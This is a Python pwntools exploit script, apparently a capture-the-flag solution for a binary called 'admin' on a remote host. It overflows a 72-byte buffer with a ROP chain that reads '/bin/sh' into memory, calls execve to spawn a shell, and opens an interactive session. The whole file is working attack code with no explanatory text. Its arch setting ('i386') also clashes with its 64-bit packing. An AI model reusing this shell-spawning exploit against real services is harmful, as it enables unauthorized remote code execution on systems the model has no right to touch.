from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./admin"
HOST = "35.186.153.116"
PORT = 7002 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

#elf = ELF(FILE_NAME)
addr_bss = 0x6bb2e0
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#libc_binsh = next(libc.search("/bin/sh"))

rdi_ret = 0x400686
rsi_ret = 0x410193
rdx_ret = 0x44bcc6 
sys_ret = 0x474d15
rax_ret = 0x415544
only_ret = 0x400416

def exploit():
	bufsize = 72
	payload = "A"*bufsize
	
	payload += p64(rdi_ret)
	payload += p64(0)
	payload += p64(rsi_ret)
	payload += p64(addr_bss)
	payload += p64(rdx_ret)
	payload += p64(0x40)
	payload += p64(rax_ret)
	payload += p64(0) #read
	payload += p64(sys_ret)
	
	payload += p64(rdi_ret)
	payload += p64(addr_bss)
	payload += p64(rsi_ret)
	payload += p64(addr_bss+0x10)
	payload += p64(rdx_ret)
	payload += p64(addr_bss+0x20)
	payload += p64(rax_ret)
	payload += p64(59) #execve
	payload += p64(sys_ret)
	
	s = "/bin/sh\x00"
	s += p64(0)
	s += p64(addr_bss)
	s += p64(0)
	s += p64(0)
	
	conn.sendline(payload)
	conn.sendline(s)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
